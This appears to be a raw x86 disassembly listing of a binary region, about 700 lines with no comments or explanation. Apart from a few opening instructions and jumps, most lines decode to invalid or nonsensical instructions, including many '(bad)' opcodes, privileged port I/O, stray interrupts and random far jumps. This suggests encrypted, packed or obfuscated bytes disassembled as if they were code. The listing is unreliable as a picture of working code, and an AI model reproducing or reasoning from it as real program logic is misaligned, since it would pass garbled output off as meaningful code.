  406a20:	mov    eax,DWORD PTR [ebp-0x14]
  406a23:	mov    ebx,DWORD PTR [ebp-0x8]
  406a26:	xor    DWORD PTR ds:0x434583,ebx
  406a2c:	mov    ecx,0x7510851
  406a31:	xor    eax,ecx
  406a33:	sbb    esi,DWORD PTR ds:0x4344fb
  406a39:	mov    esi,0x327299
  406a3e:	xor    ebx,ecx
  406a40:	add    DWORD PTR ds:0x43453b,0x4345f7
  406a4a:	xor    edx,edx
  406a4c:	add    eax,esi
  406a4e:	sbb    DWORD PTR ds:0x4344df,0x1c54
  406a58:	add    ebx,esi
  406a5a:	div    ebx
  406a5c:	mov    DWORD PTR ds:0x434537,edi
  406a62:	jmp    0x406e50
  406a67:	inc    ebx
  406a68:	push   ebp
  406a69:	sti    
  406a6a:	sbb    DWORD PTR [ebp-0x49aabca3],0xffffff8a
  406a71:	mov    ds:0x4eea0feb,eax
  406a76:	pop    eax
  406a77:	popf   
  406a78:	(bad)  
  406a79:	jle    0x406af9
  406a7b:	dec    edi
  406a7c:	jns    0x406afc
  406a7e:	jle    0x406aee
  406a80:	outs   dx,DWORD PTR ds:[esi]
  406a81:	jg     0x406adc
  406a83:	xor    BYTE PTR [ebx-0x2f1c099],0xfe
  406a8a:	push   es
  406a8b:	mov    BYTE PTR [eax+0x33bf5ff7],cl
  406a91:	cmp    esi,DWORD PTR [eax+ebp*1]
  406a94:	lock inc edi
  406a96:	mov    eax,ds:0xfafef74f
  406a9b:	inc    eax
  406a9c:	sbb    dh,cl
  406a9e:	push   edi
  406a9f:	dec    edx
  406aa0:	das    
  406aa1:	inc    eax
  406aa2:	loop   0x406aac
  406aa4:	lds    ebx,FWORD PTR [ebx+0x79]
  406aa7:	push   ds
  406aa8:	add    al,dl
  406aaa:	outs   dx,BYTE PTR ds:[esi]
  406aab:	inc    eax
  406aac:	sub    bl,ah
  406aae:	and    al,0x7e
  406ab0:	imul   eax,DWORD PTR [ebp+0x78c6864d],0x47
  406ab7:	push   eax
  406ab8:	pop    ebp
  406ab9:	dec    ebx
  406aba:	test   al,0xe8
  406abc:	adc    DWORD PTR [edi],0xffffffd3
  406abf:	jnp    0x406add
  406ac1:	cli    
  406ac2:	cmc    
  406ac3:	mov    DWORD PTR [esi+0x29bf4e2b],ecx
  406ac9:	xor    edx,edx
  406acb:	fnsave gs:[esi]
  406ace:	test   al,0x43
  406ad0:	dec    eax
  406ad1:	push   0xffffff8a
  406ad3:	aad    0x3f
  406ad5:	add    eax,0x21c0e0a5
  406ada:	jne    0x406b4c
  406adc:	iret   
  406add:	dec    esp
  406ade:	enter  0x26c4,0x68
  406ae2:	adc    al,0x29
  406ae4:	inc    ebp
  406ae5:	push   edx
  406ae6:	jbe    0x406b38
  406ae8:	fld    DWORD PTR [ebp+0x702ec107]
  406aee:	repnz and DWORD PTR [edx-0x25216a40],esp
  406af5:	sahf   
  406af6:	sub    ch,dl
  406af8:	jmp    0x2fe7:0x9024a398
  406aff:	not    DWORD PTR [esi-0x67]
  406b02:	push   esp
  406b03:	dec    eax
  406b04:	stos   BYTE PTR es:[edi],al
  406b05:	lds    edi,FWORD PTR [edx]
  406b07:	and    DWORD PTR [eax+0x1],0x37
  406b0b:	in     al,0x43
  406b0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b0e:	push   edi
  406b0f:	aas    
  406b10:	loopne 0x406b0d
  406b12:	mov    ds:0x2ee864b6,al
  406b17:	clc    
  406b18:	repnz cs inc esp
  406b1b:	cmc    
  406b1c:	fcom   QWORD PTR [ecx-0x5e3feb08]
  406b22:	fdivrp st(1),st
  406b24:	jbe    0x406b65
  406b26:	pop    esp
  406b27:	stc    
  406b28:	cld    
  406b29:	les    edi,FWORD PTR [eax]
  406b2b:	adc    DWORD PTR [ebx-0x23],0xd211444f
  406b32:	inc    ebx
  406b33:	popf   
  406b34:	sub    dh,BYTE PTR [edx-0x54]
  406b37:	pop    edx
  406b38:	es push ebp
  406b3a:	jle    0x406acd
  406b3c:	mov    bl,0xb2
  406b3e:	imul   edi,DWORD PTR [edi+0x7a2c7949],0xb8b021e3
  406b48:	pop    es
  406b49:	pop    esi
  406b4a:	adc    al,0xd2
  406b4c:	aam    0x1f
  406b4e:	dec    ebp
  406b4f:	gs inc edi
  406b51:	adc    ebx,ecx
  406b53:	into   
  406b54:	fcom   DWORD PTR [ecx+0x44]
  406b57:	sahf   
  406b58:	push   ebx
  406b59:	xor    eax,0x7b535155
  406b5e:	ja     0x406bca
  406b60:	mov    ah,0x43
  406b62:	fbstp  TBYTE PTR [ebx+0xb]
  406b65:	sub    dh,BYTE PTR [ecx]
  406b67:	ins    BYTE PTR es:[edi],dx
  406b68:	int    0xcc
  406b6a:	and    ebx,DWORD PTR ds:0x2871ff95
  406b70:	xor    eax,0x7bf45b76
  406b75:	into   
  406b76:	adc    ecx,DWORD PTR [ecx+0x6f]
  406b79:	jmp    DWORD PTR [esi+edx*1-0x2b612e07]
  406b80:	xchg   ebp,eax
  406b81:	popf   
  406b82:	std    
  406b83:	int3   
  406b84:	sub    dh,bh
  406b86:	call   0x80590933
  406b8b:	push   ds
  406b8c:	in     eax,dx
  406b8d:	sbb    DWORD PTR [edx],0xe6e35101
  406b93:	dec    BYTE PTR [esi-0x59]
  406b96:	fcomp  DWORD PTR [ebx]
  406b98:	adc    edx,DWORD PTR [ebx+0x9fc42e5]
  406b9e:	ret    0xcf8f
  406ba1:	sub    BYTE PTR ds:0xb018f84b,ch
  406ba7:	jb     0x406bc7
  406ba9:	mov    ch,0xa8
  406bab:	push   ss
  406bac:	inc    eax
  406bad:	scas   al,BYTE PTR es:[edi]
  406bae:	cmc    
  406baf:	xlat   BYTE PTR ds:[ebx]
  406bb0:	xchg   edx,eax
  406bb1:	ror    DWORD PTR [ebx],1
  406bb3:	or     eax,0x6a231ee6
  406bb8:	xchg   ecx,eax
  406bb9:	jo     0x406bcb
  406bbb:	imul   esi,ebp,0x92ac3efa
  406bc1:	sub    al,0x2a
  406bc3:	out    0xe7,eax
  406bc5:	adc    DWORD PTR [edi],ebp
  406bc7:	jmp    0x2420770c
  406bcc:	sbb    edi,DWORD PTR [ecx]
  406bce:	mov    ds:0xaafe6fa6,eax
  406bd3:	mov    esp,0x5da5b942
  406bd8:	dec    eax
  406bd9:	dec    esp
  406bda:	stos   BYTE PTR es:[edi],al
  406bdb:	push   cs
  406bdc:	aam    0x43
  406bde:	out    dx,eax
  406bdf:	scas   al,BYTE PTR es:[edi]
  406be0:	rcr    DWORD PTR gs:[eax+0x5120d2a5],cl
  406be7:	push   es
  406be8:	dec    eax
  406be9:	mov    fs:0xb2058a39,al
  406bef:	pop    esp
  406bf0:	dec    esi
  406bf1:	xchg   ebp,eax
  406bf2:	sar    BYTE PTR [ecx],0x52
  406bf5:	(bad)  
  406bf6:	in     al,dx
  406bf7:	hlt    
  406bf8:	and    eax,ecx
  406bfa:	adc    bh,BYTE PTR [ebx+0x5d3fa77c]
  406c00:	push   ss
  406c01:	mov    DWORD PTR [eax+ebp*8],ecx
  406c04:	add    eax,DWORD PTR [edx]
  406c06:	jle    0x406c16
  406c08:	pop    ds
  406c09:	cmc    
  406c0a:	jg     0x406c5b
  406c0c:	loop   0x406c66
  406c0e:	add    DWORD PTR [edi-0x45],ebx
  406c11:	int3   
  406c12:	stos   DWORD PTR es:[edi],eax
  406c13:	push   ds
  406c14:	adc    BYTE PTR [edx-0x73],ah
  406c17:	cmp    eax,0xa7a90e72
  406c1c:	mov    al,0xb0
  406c1e:	(bad)  
  406c1f:	cli    
  406c20:	hlt    
  406c21:	and    BYTE PTR [edi+edi*1+0x53ac2e61],0x88
  406c29:	mov    edx,0xe2a8aa76
  406c2e:	mov    ch,0xc2
  406c30:	jb     0x406c41
  406c32:	push   eax
  406c33:	mov    cl,0x55
  406c35:	scas   eax,DWORD PTR es:[edi]
  406c36:	dec    ecx
  406c37:	push   cs
  406c38:	dec    ebp
  406c39:	push   es
  406c3a:	jne    0x406ca5
  406c3c:	xchg   ebp,eax
  406c3d:	mov    ebp,DWORD PTR [ecx-0x1d]
  406c40:	xchg   ecx,eax
  406c41:	lock sbb ebp,ecx
  406c44:	not    esp
  406c46:	stc    
  406c47:	mov    ebp,0xb1e3bc20
  406c4c:	push   ss
  406c4d:	inc    ecx
  406c4e:	clc    
  406c4f:	mov    esi,0x269b14b6
  406c54:	popa   
  406c55:	int    0x92
  406c57:	jno    0x406c8d
  406c59:	or     al,0x21
  406c5b:	or     al,bh
  406c5d:	cmp    BYTE PTR ds:0xed9cb62d,0x1c
  406c64:	ja     0x406c5a
  406c66:	mov    DWORD PTR [ebp+0x6270ed8e],esp
  406c6c:	jbe    0x406c48
  406c6e:	outs   dx,BYTE PTR ds:[esi]
  406c6f:	mov    esp,DWORD PTR [esi+ebp*2]
  406c72:	adc    BYTE PTR [ecx+0x2],al
  406c75:	mov    DWORD PTR [ecx+0x163c09dd],eax
  406c7b:	inc    edi
  406c7c:	xor    al,0xe0
  406c7e:	cmp    ecx,ecx
  406c80:	xor    cl,BYTE PTR [eax-0x46d61058]
  406c86:	inc    edx
  406c87:	pushf  
  406c88:	or     edi,DWORD PTR [edx+0x5d2724ee]
  406c8e:	sub    ch,BYTE PTR [edi-0x24]
  406c91:	ss jmp 0x44de299c
  406c97:	add    dl,BYTE PTR [eax-0x263f3fa0]
  406c9d:	int3   
  406c9e:	dec    ecx
  406c9f:	ret    0x8fa7
  406ca2:	sbb    DWORD PTR [ebx],ebp
  406ca4:	aad    0xef
  406ca6:	push   ds
  406ca7:	xor    eax,esp
  406ca9:	repz ficom DWORD PTR [ecx+0x9]
  406cad:	sahf   
  406cae:	xor    eax,0xddb03612
  406cb3:	test   bh,al
  406cb5:	add    edi,esp
  406cb7:	rcl    esp,0x26
  406cba:	sbb    DWORD PTR [esi+0x375ce7db],eax
  406cc0:	mov    edx,0x8806841c
  406cc5:	dec    esp
  406cc6:	fwait
  406cc7:	call   DWORD PTR [edx]
  406cc9:	and    eax,0xa44f49
  406cce:	sub    al,0xe8
  406cd0:	pop    ss
  406cd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cd2:	push   edi
  406cd3:	mov    dl,0x8a
  406cd5:	xor    DWORD PTR [ebx-0x6a5afd4c],ebx
  406cdb:	or     esi,edx
  406cdd:	(bad)  
  406cde:	bound  ebp,QWORD PTR [eax]
  406ce0:	(bad)  
  406ce1:	scas   al,BYTE PTR es:[edi]
  406ce2:	mov    dh,0xda
  406ce4:	inc    eax
  406ce5:	int3   
  406ce6:	inc    ebx
  406ce7:	jbe    0x406c96
  406ce9:	adc    BYTE PTR [ecx-0x50],bh
  406cec:	sub    BYTE PTR [edi-0x6b],ah
  406cef:	sub    eax,0x9f6bb309
  406cf4:	xchg   ebx,esp
  406cf6:	mov    cl,0x8
  406cf8:	clc    
  406cf9:	sahf   
  406cfa:	mov    ecx,0xee20b838
  406cff:	mov    ds:0xa21b5624,eax
  406d04:	mov    eax,0xbf444c09
  406d09:	adc    BYTE PTR [edx-0x537e7309],0x95
  406d10:	mov    esi,0xbd02878b
  406d15:	dec    ebp
  406d16:	in     al,0x4d
  406d18:	cmp    DWORD PTR [ebx],esp
  406d1a:	jo     0x406c9f
  406d1c:	xor    DWORD PTR [esi+0x1a],edi
  406d1f:	mov    esp,0x43e4eb2a
  406d24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d25:	fldenv [edx-0x65]
  406d28:	pop    ebp
  406d29:	dec    edx
  406d2a:	add    cl,BYTE PTR [esi]
  406d2c:	mov    ds:0x7ed6df4,al
  406d31:	cmp    BYTE PTR [eax+edi*8-0x30],0xd3
  406d36:	jmp    0x3b4b8e83
  406d3b:	cmp    al,0x60
  406d3d:	pop    ss
  406d3e:	aam    0x7a
  406d40:	pop    esp
  406d42:	adc    ch,bl
  406d44:	mov    ds:0xb48f0ca4,al
  406d49:	iret   
  406d4a:	adc    DWORD PTR [eax],ebx
  406d4c:	iret   
  406d4d:	cmp    al,0x7d
  406d4f:	stos   BYTE PTR es:[edi],al
  406d50:	mov    eax,0xfba61dd6
  406d55:	jecxz  0x406d83
  406d57:	icebp  
  406d58:	iret   
  406d59:	les    ebp,FWORD PTR [ebp+0x7c]
  406d5c:	and    BYTE PTR [ebx],bh
  406d5e:	cmc    
  406d5f:	mov    eax,ds:0x464360c0
  406d64:	adc    ah,BYTE PTR [ecx-0x63]
  406d67:	pop    ss
  406d68:	(bad)  
  406d69:	push   esp
  406d6a:	adc    al,0x1f
  406d6c:	(bad)  
  406d6d:	repz inc edx
  406d6f:	test   al,0x96
  406d71:	push   eax
  406d72:	push   cs
  406d73:	jae    0x406d31
  406d75:	xchg   esi,eax
  406d76:	lea    edi,[esi+0x690e0255]
  406d7c:	test   DWORD PTR [edi],0x7159227e
  406d82:	jmp    0x876e:0x5500558e
  406d89:	loope  0x406dfa
  406d8b:	dec    ecx
  406d8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d8d:	js     0x406d56
  406d8f:	jmp    0x9937:0x1f661d61
  406d96:	pop    ds
  406d97:	sub    ch,BYTE PTR [ecx-0x52]
  406d9a:	sbb    esp,DWORD PTR [ebp+0x1b]
  406d9d:	popf   
  406d9e:	sub    DWORD PTR [eax-0x4],ebx
  406da1:	stos   BYTE PTR es:[edi],al
  406da2:	xchg   ebx,eax
  406da3:	jecxz  0x406d83
  406da5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406da6:	bound  edi,QWORD PTR ds:0x8a43d212
  406dac:	xor    ebp,esi
  406dae:	test   al,0xc9
  406db0:	xchg   ecx,eax
  406db1:	xchg   BYTE PTR [eax+edi*1-0x8],ch
  406db5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406db6:	push   edi
  406db7:	mov    edi,0x78e58559
  406dbc:	cmp    edx,DWORD PTR [esi]
  406dbe:	out    dx,eax
  406dbf:	pop    esi
  406dc0:	loop   0x406d6f
  406dc2:	push   ss
  406dc3:	adc    edi,DWORD PTR [ecx-0x2c]
  406dc6:	mov    eax,ds:0x4ea76bdd
  406dcb:	cs push ebx
  406dcd:	std    
  406dce:	gs das 
  406dd0:	shr    DWORD PTR [ebp-0x4f73aab0],cl
  406dd6:	aas    
  406dd7:	and    esp,DWORD PTR cs:[si-0x7a00]
  406ddd:	or     cl,BYTE PTR [ecx-0x4f3ab6e4]
  406de3:	mov    ebp,0x4f625755
  406de8:	pop    edi
  406de9:	sbb    ebx,edx
  406deb:	adc    dl,cl
  406ded:	jbe    0x406dad
  406def:	cli    
  406df0:	test   DWORD PTR [esi-0x332ac569],esi
  406df6:	inc    ebx
  406df7:	jp     0x406dd4
  406df9:	push   ebx
  406dfa:	clc    
  406dfb:	test   al,0xdc
  406dfd:	cmc    
  406dfe:	mov    DWORD PTR [ebx],ebx
  406e00:	push   eax
  406e01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e02:	push   esi
  406e03:	aas    
  406e04:	xor    edi,ebp
  406e06:	dec    ebp
  406e07:	add    bl,dl
  406e09:	in     al,dx
  406e0a:	push   es
  406e0b:	popf   
  406e0c:	sbb    BYTE PTR [edx+0x4],0xd8
  406e10:	push   edi
  406e11:	fisttp DWORD PTR [esi+edi*8+0x4659d50c]
  406e18:	sub    bl,bl
  406e1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e1b:	dec    ecx
  406e1c:	fist   WORD PTR [esi+0x4286242c]
  406e22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e23:	jecxz  0x406dbc
  406e25:	popf   
  406e26:	cdq    
  406e27:	sti    
  406e28:	mov    ds:0xbda7795e,al
  406e2d:	inc    edi
  406e2e:	mov    ch,0xb2
  406e30:	int    0xda
  406e32:	pop    ebx
  406e33:	sub    edi,DWORD PTR [edi]
  406e35:	jno    0x406e3b
  406e37:	xchg   esp,eax
  406e38:	stos   DWORD PTR es:[edi],eax
  406e39:	out    0x3b,eax
  406e3b:	mov    esp,0xbe92c642
  406e40:	jmp    0x3638:0xac3488f6
  406e47:	dec    esi
  406e48:	inc    esp
  406e49:	out    dx,eax
  406e4a:	add    DWORD PTR [edx+0x66373296],ecx
  406e50:	mov    edx,DWORD PTR [ebp-0x20]
  406e53:	mov    DWORD PTR ds:0x434547,0x7e00
  406e5d:	jmp    0x40724b
  406e62:	xchg   dl,dl
  406e64:	mov    bl,0x98
  406e66:	jae    0x406ec1
  406e68:	popf   
  406e69:	cld    
  406e6a:	ja     0x406e58
  406e6c:	or     dh,BYTE PTR [eax-0x65dcd16]
  406e72:	out    dx,al
  406e73:	ret    
  406e74:	jle    0x406ef4
  406e76:	dec    edi
  406e77:	jns    0x406ef7
  406e79:	jle    0x406e4a
  406e7b:	jbe    0x406e82
  406e7d:	xor    DWORD PTR [ebp+0x256b335f],ebp
  406e83:	popa   
  406e84:	and    DWORD PTR [eax],edi
  406e86:	sbb    BYTE PTR [ebx+0x5d],cl
  406e89:	fistp  QWORD PTR [ebx+0x70cc82a2]
  406e8f:	cmp    eax,0xa45f0a1f
  406e95:	nop
  406e96:	fisttp WORD PTR [esi]
  406e98:	icebp  
  406e99:	xor    ebx,edi
  406e9b:	outs   dx,DWORD PTR ds:[esi]
  406e9c:	clc    
  406e9d:	inc    ecx
  406e9e:	daa    
  406e9f:	clc    
  406ea0:	mov    ds:0x5ad75b86,eax
  406ea5:	xor    DWORD PTR [ebx+0x56579588],esp
  406eab:	sbb    al,0x68
  406ead:	jle    0x406f06
  406eaf:	dec    ebx
  406eb0:	mov    dl,0xb
  406eb2:	imul   ebx,DWORD PTR [edi*2-0x7d1fd08b],0xffffffe0
  406eba:	das    
  406ebb:	or     al,0x1f
  406ebd:	jae    0x406f1d
  406ebf:	cmp    DWORD PTR [ecx+0x56],ecx
  406ec2:	push   esp
  406ec3:	aam    0xbd
  406ec5:	fidivr DWORD PTR ss:[ebp-0x2a]
  406ec9:	pop    ebx
  406eca:	dec    ebx
  406ecb:	cmp    dh,BYTE PTR [esi+0x54]
  406ece:	sbb    al,0x35
  406ed0:	stos   BYTE PTR es:[edi],al
  406ed1:	inc    edi
  406ed2:	aad    0x7f
  406ed4:	dec    edx
  406ed5:	xor    ebp,DWORD PTR [edx]
  406ed7:	cmp    al,0x5a
  406ed9:	pushf  
  406eda:	jnp    0x406ed5
  406edc:	ror    BYTE PTR [edx],1
  406ede:	loopne 0x406e6c
  406ee0:	jb     0x406f50
  406ee2:	fnstenv [edx-0x38]
  406ee5:	sbb    ch,BYTE PTR [ebp+0x20]
  406ee8:	jo     0x406e9d
  406eea:	xchg   DWORD PTR [edx+0x74770c4f],edx
  406ef0:	sbb    DWORD PTR [ebp+0x15],ecx
  406ef3:	xchg   ebp,eax
  406ef4:	sub    ebp,DWORD PTR [eax]
  406ef6:	push   ecx
  406ef7:	mov    ds:0xa9b5a19c,al
  406efc:	in     al,dx
  406efd:	ins    DWORD PTR es:[edi],dx
  406efe:	cmp    ebx,DWORD PTR [esi+0x38]
  406f01:	retf   
  406f02:	out    dx,al
  406f03:	stc    
  406f04:	dec    esp
  406f05:	mov    cl,0x37
  406f07:	xchg   ebp,eax
  406f08:	not    DWORD PTR [esp+eiz*8+0x1e3a9e00]
  406f0f:	out    0x47,eax
  406f11:	imul   ebp,DWORD PTR [edi+0x6a],0xc45174f7
  406f18:	mov    al,ds:0x1f3838ef
  406f1d:	(bad)  
  406f1e:	push   0xdec22e74
  406f23:	dec    eax
  406f24:	aas    
  406f25:	adc    bl,al
  406f27:	int    0x84
  406f29:	xchg   edi,eax
  406f2a:	cmp    al,0xee
  406f2c:	hlt    
  406f2d:	hlt    
  406f2e:	movlps xmm6,QWORD PTR [ecx+0x5a672783]
  406f35:	cmc    
  406f36:	sbb    al,0x3b
  406f38:	adc    bl,dh
  406f3a:	jmp    0x2ca5:0x75ef1a60
  406f41:	mov    dh,0xf0
  406f43:	imul   bp
  406f46:	and    DWORD PTR [edx],0xa
  406f49:	stos   DWORD PTR es:[edi],eax
  406f4a:	inc    ebx
  406f4b:	sbb    al,0x3b
  406f4d:	mov    ah,0xf8
  406f4f:	(bad)  
  406f50:	(bad)  
  406f51:	pop    edi
  406f52:	pop    edi
  406f53:	das    
  406f54:	imul   eax,DWORD PTR [edx+0x7673c04d],0x66942976
  406f5e:	or     DWORD PTR [eax+eiz*4],edi
  406f61:	xchg   edi,eax
  406f62:	inc    ebp
  406f63:	mov    WORD PTR [edi-0xb],es
  406f66:	adc    DWORD PTR [ebx-0x605c8a32],ebx
  406f6c:	jmp    0x7aafd1bf
  406f71:	sti    
  406f72:	cs dec eax
  406f74:	or     DWORD PTR [edi-0x3cca74f3],edx
  406f7a:	outs   dx,DWORD PTR ds:[esi]
  406f7b:	add    esi,DWORD PTR [ecx-0x5f]
  406f7e:	push   ds
  406f7f:	xchg   ebp,eax
  406f80:	sub    cx,WORD PTR [edx]
  406f83:	sahf   
  406f84:	hlt    
  406f85:	inc    BYTE PTR [esi]
  406f87:	mov    ecx,0x5be4361e
  406f8c:	mov    ds:0xc0fc52cf,eax
  406f91:	push   0xfffffff5
  406f93:	lods   al,BYTE PTR ds:[esi]
  406f94:	call   0xf56f85fd
  406f99:	push   ss
  406f9a:	fdivr  DWORD PTR [ebp+0x509f7899]
  406fa0:	nop
  406fa1:	and    ebx,ecx
  406fa3:	test   DWORD PTR [ebx+0x5dfe0665],edx
  406fa9:	inc    eax
  406faa:	aas    
  406fab:	js     0x406f41
  406fad:	pop    edx
  406fae:	repz repz mov esp,0x1ad1b966
  406fb5:	sub    DWORD PTR [ebx],esi
  406fb7:	pop    ebx
  406fb8:	mov    al,ds:0xc73382fa
  406fbd:	push   DWORD PTR [ebp-0x709e9154]
  406fc3:	xor    al,0x55
  406fc5:	mov    ebp,0xa24eb261
  406fca:	popf   
  406fcb:	sbb    BYTE PTR [edi],dh
  406fcd:	ret    0xa249
  406fd0:	ss dec esp
  406fd2:	mov    eax,ds:0xf383276c
  406fd7:	and    al,0x4e
  406fd9:	dec    esp
  406fda:	retf   
  406fdb:	or     DWORD PTR [esi],edx
  406fdd:	and    ebp,eax
  406fdf:	aad    0x2
  406fe1:	js     0x406fcd
  406fe3:	popf   
  406fe4:	and    ebx,edx
  406fe6:	xor    eax,0xf08d7f8a
  406feb:	dec    eax
  406fec:	sbb    al,0xa7
  406fee:	and    edi,eax
  406ff0:	xchg   esi,eax
  406ff1:	mov    edi,edx
  406ff3:	lods   eax,DWORD PTR ds:[esi]
  406ff4:	ror    DWORD PTR [edi],1
  406ff6:	sbb    al,0x50
  406ff8:	(bad)  
  406ff9:	stc    
  406ffa:	sbb    BYTE PTR ds:0x663d4384,cl
  407000:	push   edx
  407001:	add    al,0x26
  407003:	xor    BYTE PTR [eax+0x3d0afe4c],dl
  407009:	mov    ds:0x32eb4641,eax
  40700e:	dec    edi
  40700f:	adc    BYTE PTR [esi+0x45aa7a32],cl
  407015:	neg    ebp
  407017:	repnz or edx,DWORD PTR [edx]
  40701a:	inc    ebx
  40701b:	mov    cl,0x76
  40701d:	lds    ecx,FWORD PTR [edx+ecx*2-0x44]
  407021:	add    cl,BYTE PTR [edx-0x656e1f76]
  407027:	jnp    0x406fbf
  407029:	test   al,0x5d
  40702b:	or     eax,0x4fa9ebfd
  407030:	loop   0x407021
  407032:	sbb    dh,BYTE PTR [eax]
  407034:	jp     0x40705c
  407036:	adc    edx,DWORD PTR [ecx]
  407038:	data16 hlt 
  40703a:	sub    eax,0x1097a9f
  40703f:	sti    
  407040:	mov    edx,0x1dda90dd
  407045:	add    BYTE PTR [ebx+0x7e],ch
  407048:	xchg   edx,eax
  407049:	(bad)  
  40704a:	out    dx,al
  40704b:	mov    al,0x58
  40704d:	jnp    0x407044
  40704f:	pop    ebx
  407050:	jmp    0x50ea:0xa605f59b
  407057:	in     eax,dx
  407058:	fsub   QWORD PTR [esi]
  40705a:	(bad)  
  40705b:	and    eax,0xefd525fc
  407060:	jae    0x4070cb
  407062:	xor    al,0xd3
  407064:	and    al,0xaa
  407066:	int    0xc4
  407068:	cmp    cl,cl
  40706a:	sub    DWORD PTR [edi],0x63
  40706d:	cdq    
  40706e:	ret    
  40706f:	inc    esp
  407070:	sub    DWORD PTR [ebp-0x4b],ecx
  407073:	cmp    bl,BYTE PTR [eax-0x70a86116]
  407079:	inc    esp
  40707a:	es push 0x84bae7e5
  407080:	mov    eax,0x8723528e
  407085:	sub    al,0xdb
  407087:	inc    edx
  407088:	xchg   esp,eax
  407089:	lahf   
  40708a:	adc    BYTE PTR [ebx+0x1db323a1],0xfd
  407091:	scas   eax,DWORD PTR es:[edi]
  407092:	neg    edx
  407094:	xor    BYTE PTR [ecx+0x3c],ch
  407097:	pop    ebx
  407098:	sbb    al,0x3e
  40709a:	(bad)  
  40709b:	lea    eax,[ebx-0x13]
  40709e:	adc    DWORD PTR ds:0x23e0f94d,0xffffffa9
  4070a5:	bound  ebx,QWORD PTR [ebx+0x542214f5]
  4070ab:	sar    BYTE PTR [esi],0x80
  4070ae:	or     ebx,DWORD PTR [edx+0x5a]
  4070b1:	out    0x38,eax
  4070b3:	stos   DWORD PTR es:[edi],eax
  4070b4:	push   0x13
  4070b6:	jb     0x40705e
  4070b8:	int    0xf7
  4070ba:	push   ds
  4070bb:	push   ds
  4070bc:	in     al,dx
  4070bd:	lea    ebx,[esi+0xa3f30fe]
  4070c3:	jg     0x4070c4
  4070c5:	dec    ebp
  4070c6:	jno    0x407126
  4070c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070c9:	les    esp,FWORD PTR [ecx-0x6d]
  4070cc:	std    
  4070cd:	das    
  4070ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070cf:	icebp  
  4070d0:	mov    ebx,0x6b88f881
  4070d5:	inc    ebx
  4070d6:	fimul  DWORD PTR [ebp+eax*1-0x63]
  4070da:	sub    DWORD PTR [esi],ecx
  4070dc:	in     al,dx
  4070dd:	and    al,0xad
  4070df:	cmp    BYTE PTR [edi],cl
  4070e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070e2:	ss jp  0x40709d
  4070e5:	xor    edx,DWORD PTR [eax+0x7b1fd972]
  4070eb:	jbe    0x40714c
  4070ed:	mov    eax,ds:0x95f2494a
  4070f2:	jbe    0x407116
  4070f4:	imul   ebp,ebx,0x25
  4070f7:	fnstcw WORD PTR [edi+ebx*8]
  4070fa:	out    0x26,eax
  4070fc:	mov    dl,0xcf
  4070fe:	pop    edi
  4070ff:	jg     0x40713e
  407101:	add    edx,DWORD PTR [esi+0x44]
  407104:	jno    0x40717e
  407106:	mov    ch,0x22
  407108:	jno    0x407117
  40710a:	arpl   WORD PTR [ebx-0x66],ax
  40710d:	jecxz  0x4070a6
  40710f:	mov    al,ds:0x5d90bc7e
  407114:	inc    esp
  407115:	jo     0x407172
  407117:	mov    ch,0x5a
  407119:	jmp    0x407107
  40711b:	test   eax,0x8469cf4d
  407120:	sti    
  407121:	jg     0x40714c
  407123:	jp     0x4070d6
  407125:	dec    esi
  407126:	xchg   ebp,eax
  407127:	jmp    0x9b9dd6f9
  40712c:	and    al,0xc6
  40712e:	ins    BYTE PTR es:[edi],dx
  40712f:	jmp    0x4070d3
  407131:	push   ds
  407132:	add    edx,edx
  407134:	imul   ebx,DWORD PTR [esi],0x5c
  407137:	add    DWORD PTR [edx-0x7c],ebp
  40713a:	jp     0x407182
  40713c:	inc    edx
  40713d:	sbb    dl,BYTE PTR [ebp+0x36]
  407140:	les    ebp,FWORD PTR [ecx+0x3e03040c]
  407146:	and    DWORD PTR [eax+0x4],0xffffffc3
  40714a:	xchg   edi,eax
  40714b:	pop    edi
  40714c:	cdq    
  40714d:	fidiv  DWORD PTR [edi-0x10]
  407150:	(bad)  
  407151:	mov    WORD PTR [edi-0x1d],?
  407154:	pop    ebx
  407155:	pop    ebp
  407156:	pop    ebp
  407157:	mov    eax,?
  407159:	(bad)  
  40715a:	nop
  40715b:	cdq    
  40715c:	int    0x71
  40715e:	jle    0x407178
  407160:	stc    
  407161:	push   esi
  407162:	sbb    BYTE PTR gs:[edi-0x5e],0xd4
  407167:	mov    esp,0x79562fce
  40716c:	(bad)  
  40716d:	aam    0x81
  40716f:	push   0x2e
  407171:	lods   al,BYTE PTR ds:[esi]
  407172:	icebp  
  407173:	test   eax,0x7df9384f
  407178:	and    BYTE PTR [ebx*4+0x7ed809a8],0x56
  407180:	add    ebx,DWORD PTR [edi+0x30]
  407183:	sub    al,0xaf
  407185:	jp     0x40715d
  407187:	push   ebx
  407188:	repnz pusha 
  40718a:	sbb    ecx,DWORD PTR [ecx]
  40718c:	jbe    0x4071f6
  40718e:	nop
  40718f:	xchg   DWORD PTR [ebp+0x7716e059],edx
  407195:	arpl   WORD PTR [edx],di
  407197:	ficomp DWORD PTR [esi-0x1e105262]
  40719d:	pop    esp
  40719e:	sti    
  40719f:	hlt    
  4071a0:	js     0x40713a
  4071a2:	sub    DWORD PTR [esi],0xffffffe4
  4071a5:	or     al,0x4e
  4071a7:	and    eax,DWORD PTR [edx-0x6a]
  4071aa:	jbe    0x407165
  4071ac:	retf   0x5787
  4071af:	mov    bh,0x82
  4071b1:	out    0xda,eax
  4071b3:	dec    ebx
  4071b4:	repnz dec ebx
  4071b6:	mov    ebp,0x37030fbc
  4071bb:	sbb    eax,0xa58f55d8
  4071c0:	dec    esi
  4071c1:	mov    esi,0x9fcf5d99
  4071c6:	or     al,al
  4071c8:	or     BYTE PTR [edi+0x758a3ac2],cl
  4071ce:	mov    ?,ecx
  4071d0:	mov    cl,0xf1
  4071d2:	mov    edi,0xe21a079b
  4071d7:	push   0x8f4dea12
